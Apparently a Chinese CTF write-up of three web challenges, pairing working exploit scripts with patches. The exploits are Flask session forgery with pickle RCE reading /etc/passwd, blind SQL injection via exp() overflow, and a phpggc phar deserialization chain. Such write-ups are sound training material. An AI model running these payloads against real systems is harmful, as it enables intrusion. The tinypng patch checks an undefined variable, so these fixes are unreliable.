> 原文链接: https://www.anquanke.com//post/id/239993 


# 2021虎符CTF 线下赛 Web Write Up


                                阅读量   
                                **107655**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t0177e9dfcd42fb410b.jpg)](https://p2.ssl.qhimg.com/t0177e9dfcd42fb410b.jpg)



## easyflask

从`/proc/self/environ` 获取环境变量发现里面有`secret_key`可以拿这个`secret_key`伪造session，从而触发源码中的pickle反序列化实现RCE

Exp

```
import base64
import pickle
from flask.sessions import SecureCookieSessionInterface
import re
import pickletools
import requests

url = "http://dadc77b3-9752-430c-88f7-30055e8b9f2a.node3.buuoj.cn"

#url = "http://127.0.0.1:80"

def get_secret_key():
    target = url + "/file?file=/proc/self/environ"
    r = requests.get(target)
    #print(r.text)
    key = re.findall('key=(.*?)OLDPWD',r.text)
    return str(key[0])

secret_key = get_secret_key()
#secret_key = "glzjin22948575858jfjfjufirijidjitg3uiiuuh"

print(secret_key)


class FakeApp:
    secret_key = secret_key

class User(object):
    def __reduce__(self):
        import os
        cmd = "cat /etc/passwd &gt; /tmp/eki"
        return (os.system,(cmd,))

exp = `{`
    "b":base64.b64encode(pickle.dumps(User()))
`}`

#pickletools.dis(pickle.dumps(User()))
#print(pickletools.dis(b'\x80\x03cprogram_main_app@@@\nUser\nq\x00)\x81q\x01.'))

fake_app = FakeApp()
session_interface = SecureCookieSessionInterface()
serializer = session_interface.get_signing_serializer(fake_app)
cookie = serializer.dumps(
    #`{`'u': b'\x80\x03cprogram_main_app@@@\nUser\nq\x01)\x81q\x01.'`}`
    #`{`'u':b'\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04User\x94\x93\x94.'`}`
    `{`'u':exp`}`
)
print(cookie)

headers = `{`
    "Accept":"*/*",
    "Cookie":"session=`{`0`}`".format(cookie)
`}`

req = requests.get(url+"/admin",headers=headers)

#print(req.text)

req = requests.get(url+"/file?file=/tmp/eki",headers=headers)

print(req.text)
```

### <a class="reference-link" name="%E4%BF%AE%E5%A4%8D%E6%80%9D%E8%B7%AF"></a>修复思路

把任意文件读修复就行，赛方的exp应该是每次手动拿secret_key,但是线下的时候以为这个点是正常业务，一直没修成功，心态崩了。

```
#!/usr/bin/python3.6
import os
import pickle

from base64 import b64decode
from flask import Flask, request, render_template, session

app = Flask(__name__)
app.config["SECRET_KEY"] = 'you_find_secret_k3y_c0ngratulations'

User = type('User', (object,), `{`
    'uname': 'test',
    'is_admin': 0,
    '__repr__': lambda o: o.uname,
`}`)


@app.route('/', methods=('GET',))
def index_handler():
    if not session.get('u'):
        u = pickle.dumps(User())
        session['u'] = u
    return render_template('index.html')


@app.route('/file', methods=('GET',))
def file_handler():
    path = request.args.get('file')
    if path.startswith("/"):
        return 'disallowed'
    path = os.path.join('static', path)
    if not os.path.exists(path) or os.path.isdir(path) \
            or '.py' in path or '.sh' in path or '..' in path or "flag" in path or "proc" in path:
        return 'disallowed'

    with open(path, 'r') as fp:
        content = fp.read()
    return content


@app.route('/admin', methods=('GET',))
def admin_handler():
    try:
        u = session.get('u')
        if isinstance(u, dict): 
            u = b64decode(u.get('b'))
        if "R" in u:
            return 'uhh?'
        u = pickle.loads(u)

    except Exception:
        return 'uhh?'

    if u.is_admin == 1:
        return 'welcome, admin'
    else:
        return 'who are you?'


if __name__ == '__main__':
    app.run('0.0.0.0', port=80, debug=True)
```



## hatenum (BUUOJ 复现)

```
&lt;?php
error_reporting(0);
session_start();
class User`{`
    public $host = "localhost";
    public $user = "root";
    public $pass = "123456";
    public $database = "ctf";
    public $conn;
    function __construct()`{`
        $this-&gt;conn = new mysqli($this-&gt;host,$this-&gt;user,$this-&gt;pass,$this-&gt;database);
        if(mysqli_connect_errno())`{`
            die('connect error');
        `}`
    `}`
    function find($username)`{`
        $res = $this-&gt;conn-&gt;query("select * from users where username='$username'");
        if($res-&gt;num_rows&gt;0)`{`
            return True;
        `}`
        else`{`
            return False;
        `}`

    `}`
    function register($username,$password,$code)`{`
        if($this-&gt;conn-&gt;query("insert into users (username,password,code) values ('$username','$password','$code')"))`{`
            return True;
        `}`
        else`{`
            return False;
        `}`
    `}`
    function login($username,$password,$code)`{`
        $res = $this-&gt;conn-&gt;query("select * from users where username='$username' and password='$password'");
        if($this-&gt;conn-&gt;error)`{`
            return 'error';
        `}`
        else`{`
            $content = $res-&gt;fetch_array();
            if($content['code']===$_POST['code'])`{`
                $_SESSION['username'] = $content['username'];
                return 'success';
            `}`
            else`{`
                return 'fail';
            `}`
        `}`

    `}`
`}`

function sql_waf($str)`{`
    if(preg_match('/union|select|or|and|\'|"|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i', $str))`{`
        die('Hack detected');
    `}`
`}`

function num_waf($str)`{`
    if(preg_match('/\d`{`9`}`|0x[0-9a-f]`{`9`}`/i',$str))`{`
        die('Huge num detected');
    `}`
`}`

function array_waf($arr)`{`
    foreach ($arr as $key =&gt; $value) `{`
        if(is_array($value))`{`
            array_waf($value);
        `}`
        else`{`
            sql_waf($value);
            num_waf($value);
        `}`
    `}`
`}`
```

ban了`'` 但是可以通过前后参数联合逃逸

同时可以利用mysql的exp溢出进行盲注

```
url = "http://fa57e15a-3cf4-449b-832a-120cca2c6884.node3.buuoj.cn"

data = `{`
    "username":"eki\\",
    "password":"||1&amp;&amp;exp(710)#",
    "code":"1"
`}`


req = r.post(url+"/login.php",data=data,allow_redirects=False)

print(req.text)
#error
#exp(709) login fail
```

```
url = "http://fa57e15a-3cf4-449b-832a-120cca2c6884.node3.buuoj.cn"

data = `{`
    "username":"eki\\",
    "password":"||1&amp;&amp;exp(710)#",
    "code":"1"
`}`


req = r.post(url+"/login.php",data=data,allow_redirects=False)

print(req.text)
#error
#exp(709) login fail
```

```
import requests as r
import string

url = "http://fa57e15a-3cf4-449b-832a-120cca2c6884.node3.buuoj.cn"
pt = string.ascii_letters+string.digits+"$"

#/union|select|or|and|\'|"|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i
#select * from users where username='$username' and password='$password'



def str2hex(raw):
    ret = '0x'
    for i in raw:
        ret += hex(ord(i))[2:].rjust(2,'0')
    return ret




ans = ""
tmp = "^"

for i in range(24):
    for ch in pt:
        #payload = f"||1 &amp;&amp; username rlike 0x61646d &amp;&amp; exp(710-(23-length(code)))#".replace(' ',chr(0x0c))

        payload = f"||1 &amp;&amp; username rlike 0x61646d &amp;&amp; exp(710-(code rlike binary `{`str2hex(tmp+ch)`}`))#"
        #print(payload)

        payload = payload.replace(' ',chr(0x0c))

        data = `{`
            "username":"eki\\",
            "password":payload,
            "code":"1"
        `}`

        req = r.post(url+"/login.php",data=data,allow_redirects=False)

        if 'fail' in req.text:
            ans += ch
            print(tmp+ch,ans)
            if len(tmp) == 3:
                tmp = tmp[1:]+ch
            else:
                tmp += ch

            break

'''
^e e
^er er
^erg erg
ergh ergh
rghr erghr
ghru erghru
hrui erghrui
ruig erghruig
uigh erghruigh
igh2 erghruigh2
gh2u erghruigh2u
h2uy erghruigh2uy
2uyg erghruigh2uyg
uygh erghruigh2uygh
ygh2 erghruigh2uygh2
gh2u erghruigh2uygh2u
h2uy erghruigh2uygh2uy
2uyg erghruigh2uygh2uyg
uygh erghruigh2uygh2uygh
'''


rev_ans = ""
tmp = "$"

for i in range(24):
    for ch in pt:
        #payload = f"||1 &amp;&amp; username rlike 0x61646d &amp;&amp; exp(710-(23-length(code)))#".replace(' ',chr(0x0c))

        payload = f"||1 &amp;&amp; username rlike 0x61646d &amp;&amp; exp(710-(code rlike binary `{`str2hex(ch+tmp)`}`))#"
        #print(payload)

        payload = payload.replace(' ',chr(0x0c))

        data = `{`
            "username":"eki\\",
            "password":payload,
            "code":"1"
        `}`

        req = r.post(url+"/login.php",data=data,allow_redirects=False)

        if 'fail' in req.text:
            rev_ans = ch+rev_ans
            print(ch+tmp,rev_ans)
            if len(tmp) == 3:
                tmp = ch+tmp[:-1]
            else:
                tmp = ch+tmp

            break

'''
g$ g
ig$ ig
2ig$ 2ig
32ig 32ig
u32i u32ig
iu32 iu32ig
uiu3 uiu32ig
3uiu 3uiu32ig
23ui 23uiu32ig
h23u h23uiu32ig
gh23 gh23uiu32ig
igh2 igh23uiu32ig
uigh uigh23uiu32ig
ruig ruigh23uiu32ig
hrui hruigh23uiu32ig
ghru ghruigh23uiu32ig
rghr rghruigh23uiu32ig
ergh erghruigh23uiu32ig
'''


data = `{`
    "username":"admin\\",
    "password":"||1#",
    "code":"erghruigh2uygh23uiu32ig"
`}`

req = r.post(url+"/login.php",data=data)

print(req.text)
```

因为没找到绕过拼接字符串的方法，题目中又对hex长度进行了限制，所以每三位推一位，最开始三位通过`^`和`$`的方式来匹配。

正着倒着结合一下就能拿到23位的code`erghruigh2uygh23uiu32ig`

### <a class="reference-link" name="%E4%BF%AE%E5%A4%8D%E6%80%9D%E8%B7%AF"></a>修复思路

直接把sql全换成预处理形式防止注入

```
&lt;?php
error_reporting(0);
session_start();
class User`{`
    public $host = "localhost";
    public $user = "root";
    public $pass = "123456";
    public $database = "ctf";
    public $conn;
    function __construct()`{`
        $this-&gt;conn = new mysqli($this-&gt;host,$this-&gt;user,$this-&gt;pass,$this-&gt;database);
        if(mysqli_connect_errno())`{`
            die('connect error');
        `}`
    `}`
    function find($username)`{`
        $res = $this-&gt;conn-&gt;prepare("select * from users where username=?");
        $res-&gt;bind_param("s", $username);
        $res-&gt;execute();
        #$res = $this-&gt;conn-&gt;query();
        #$res-&gt;bind_result($district);
        $res-&gt;fetch();
        if($res-&gt;num_rows&gt;0)`{`
            return True;
        `}`
        else`{`
            return False;
        `}`

    `}`
    function register($username,$password,$code)`{`
        $res = $this-&gt;conn-&gt;prepare("insert into users (username,password,code) values (?,?,?)");
        $res-&gt;bind_param("sss", $username,$password,$code);
        $res-&gt;execute();
        #$res = $this-&gt;conn-&gt;query();
        #$res-&gt;bind_result($district);
        if($res-&gt;execute())`{`
            $res-&gt;fetch();
            return True;
        `}`
        else`{`
            return False;
        `}`
    `}`
    function login($username,$password,$code)`{`
        $res = $this-&gt;conn-&gt;prepare("select code from users where username=? and password=?");
        $res-&gt;bind_param("ss", $username,$password);
        $res-&gt;bind_result($code2);
        $res-&gt;execute();
        $res-&gt;fetch();
        #$res = $this-&gt;conn-&gt;query("select * from users where username='$username' and password='$password'");
        if($this-&gt;conn-&gt;error)`{`
            return 'error';
        `}`
        else`{`
            #$content = $res-&gt;fetch_array();
            #var_dump($code2);
            if($code2===$_POST['code'])`{`
                $_SESSION['username'] = $username;
                return 'success';
            `}`
            else`{`
                return 'fail';
            `}`
        `}`

    `}`
`}`

function sql_waf($str)`{`
    if(preg_match('/union|select|or|and|\'|"|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i', $str))`{`
        die('Hack detected');
    `}`
`}`

function num_waf($str)`{`
    if(preg_match('/\d`{`9`}`|0x[0-9a-f]`{`9`}`/i',$str))`{`
        die('Huge num detected');
    `}`
`}`

function array_waf($arr)`{`
    foreach ($arr as $key =&gt; $value) `{`
        if(is_array($value))`{`
            array_waf($value);
        `}`
        else`{`
            sql_waf($value);
            num_waf($value);
        `}`
    `}`
`}`
```



## tinypng (BUUOJ 复现)

是一个laravel框架的题

那么首先关注路由和控制器

```
&lt;?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

use App\Http\Controllers\IndexController;
use App\Http\Controllers\ImageController;

Route::get('/', function () `{`
    return view('upload');
`}`);
Route::post('/', [IndexController::class, 'fileUpload'])-&gt;name('file.upload.post');

//Don't expose the /image to others!
Route::get('/image', [ImageController::class, 'handle'])-&gt;name('image.handle');

```

这俩路由分别指向`IndexController`和`ImageController`

`fileupload`能上传，文件名文件类型不可控

```
class IndexController extends Controller
`{`
    public function fileUpload(Request $req)
    `{`
        $allowed_extension = "png";
        $extension = $req-&gt;file('file')-&gt;clientExtension();
        if($extension === $allowed_extension &amp;&amp; $req-&gt;file('file')-&gt;getSize() &lt; 204800)
        `{`
            $content = $req-&gt;file('file')-&gt;get();
            if (preg_match("/&lt;\?|php|HALT\_COMPILER/i", $content ))`{`
                $error = 'Don\'t do that, please';
                return back()
                    -&gt;withErrors($error);
            `}`else `{`
                $fileName = \md5(time()) . '.png';
                $path = $req-&gt;file('file')-&gt;storePubliclyAs('uploads', $fileName);
                echo "path: $path";
                return back()
                    -&gt;with('success', 'File has been uploaded.')
                    -&gt;with('file', $path);
            `}`
        `}` else`{`
            $error = 'Don\'t do that, please';
            return back()
                -&gt;withErrors($error);
        `}`

    `}`
`}`
```

image对文件调用了`imgcompress`

```
class ImageController extends Controller
`{`
    public function handle(Request $request)
    `{`
        $source = $request-&gt;input('image');
        if(empty($source))`{`
            return view('image');
        `}`
        $temp = explode(".", $source);
        $extension = end($temp);
        if ($extension !== 'png') `{`
            $error = 'Don\'t do that, pvlease';
            return back()
                -&gt;withErrors($error);
        `}` else `{`
            $image_name = md5(time()) . '.png';
            $dst_img = '/var/www/html/' . $image_name;
            $percent = 1;
            (new imgcompress($source, $percent))-&gt;compressImg($dst_img);
            return back()-&gt;with('image_name', $image_name);
        `}`
    `}`
`}`
```

跟进可以发现调用了

```
/**
 * 内部：打开图片
 */
private function _openImage()
`{`
    list($width, $height, $type, $attr) = getimagesize($this-&gt;src);
    $this-&gt;imageinfo = array(
        'width' =&gt; $width,
        'height' =&gt; $height,
        'type' =&gt; image_type_to_extension($type, false),
        'attr' =&gt; $attr
    );
    $fun = "imagecreatefrom" . $this-&gt;imageinfo['type'];
    $this-&gt;image = $fun($this-&gt;src);
    $this-&gt;_thumpImage();
`}`
```

那么很明显利用的思路就是上传一个phar文件通过`getimagesize()`触发phar反序列化了

但是要绕过之前的

```
if (preg_match("/&lt;\?|php|HALT\_COMPILER/i", $content ))`{`
    $error = 'Don\'t do that, please';
    return back()
`}`
```

这里用`gzip`或者`bzip2`压缩的方式就可以绕过检测

链子直接phpggc一把梭

```
phpggc Laravel/RCE6 "phpinfo();" --phar phar &gt; test3.phar
gzip test3.phar
mv test3.phar test3.png
```

[![](https://p4.ssl.qhimg.com/t014dfdb8cde452f38b.png)](https://p4.ssl.qhimg.com/t014dfdb8cde452f38b.png)

### <a class="reference-link" name="%E4%BF%AE%E5%A4%8D%E6%80%9D%E8%B7%AF"></a>修复思路

phar反序列化需要用到phar协议，那么在image路由处把phar协议ban了就行

```
&lt;?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class ImageController extends Controller
`{`
    public function handle(Request $request)
    `{`
        $source = $request-&gt;input('image');
        if(preg_match('/phar/i', $str))`{`
            die('Hack detected');
        `}`

        if(empty($source))`{`
            return view('image');
        `}`
        $temp = explode(".", $source);
        $extension = end($temp);
        if ($extension !== 'png') `{`
            $error = 'Don\'t do that, pvlease';
            return back()
                -&gt;withErrors($error);
        `}` else `{`
            $image_name = md5(time()) . '.png';
            $dst_img = '/var/www/html/' . $image_name;
            $percent = 1;
            (new imgcompress($source, $percent))-&gt;compressImg($dst_img);
            return back()-&gt;with('image_name', $image_name);
        `}`
    `}`
`}`
```
